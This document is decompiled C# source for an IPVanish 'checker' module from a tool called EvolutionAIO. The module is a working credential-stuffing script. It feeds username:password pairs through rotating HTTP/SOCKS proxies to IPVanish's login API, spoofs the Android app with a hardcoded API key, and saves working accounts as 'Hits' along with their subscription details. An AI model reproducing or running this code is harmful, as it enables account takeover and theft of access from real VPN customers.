// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.IPVanish
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace EvolutionAIO.Checkers
{
  internal class IPVanish
  {
    public static bool check(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
            if (Menu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.IgnoreProtocolErrors = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            string str1 = "{\"api_key\":\"15cb936e6d19cd7db1d6f94b96017541\",\"client\":\"Android-3.4.3.10.82423b82423\",\"os\":\"22\",\"password\":\"" + s[1] + "\",\"username\":\"" + s[0] + "\",\"uuid\":\"be6fc5ec-c744-4152-8f0c-4949135f4ff5\"}";
            httpRequest.AddHeader("x-client", "ipvanish");
            httpRequest.AddHeader("x-client-version", "1.2.");
            httpRequest.AddHeader("x-platform", "Android");
            httpRequest.AddHeader("x-platform-version", "22");
            httpRequest.AddHeader("content-length", str1.Length.ToString());
            httpRequest.AddHeader("accept-encoding", "gzip");
            httpRequest.AddHeader("user-agent", "okhttp/4.4.0");
            HttpResponse httpResponse = httpRequest.Post("https://api.ipvanish.com/api/v3/login", str1, "application/json");
            if (httpResponse.ToString().Contains("The username or password provided is incorrect"))
              return false;
            if (httpResponse.ToString().Contains("\"access_token\""))
            {
              string str2 = Menu.Parse(httpResponse.ToString(), "\"account_type\":", ",");
              string str3 = Menu.Parse(httpResponse.ToString(), "\"sub_end_epoch\":", ",");
              long int64 = Convert.ToInt64(str3);
              if (int64 < 10000000000L)
                int64 *= 1000L;
              DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc).AddMilliseconds((double) int64);
              dateTime = dateTime.ToUniversalTime();
              string str4 = dateTime.ToString();
              if (DateTimeOffset.Now.ToUnixTimeSeconds() > (long) Convert.ToInt32(str3))
              {
                ++Menu.frees;
                Save.AsResult(nameof (IPVanish), "Free", s[0] + ":" + s[1] + " | Expired");
                return false;
              }
              ++Menu.hits;
              Save.AsResult(nameof (IPVanish), "Hits", s[0] + ":" + s[1]);
              Save.AsResult(nameof (IPVanish), "Capture", string.Format("{0}:{1} | Renewal Date - {2:MMM - d : yyy} | Account Type: {3}", (object) s[0], (object) s[1], (object) str4, (object) str2));
              return false;
            }
            if (httpResponse.ToString().Contains("Too many failed attempts"))
              ++Menu.errors;
            else if (httpResponse.ToString().Contains("403 Forbidden"))
              ++Menu.errors;
          }
        }
        catch (Exception ex)
        {
          if (ex.ToString().Contains("Index was outside the bounds of the array"))
            return false;
          Save.AsResult(nameof (IPVanish), "ex", ex.ToString());
          ++Menu.errors;
        }
      }
    }
  }
}
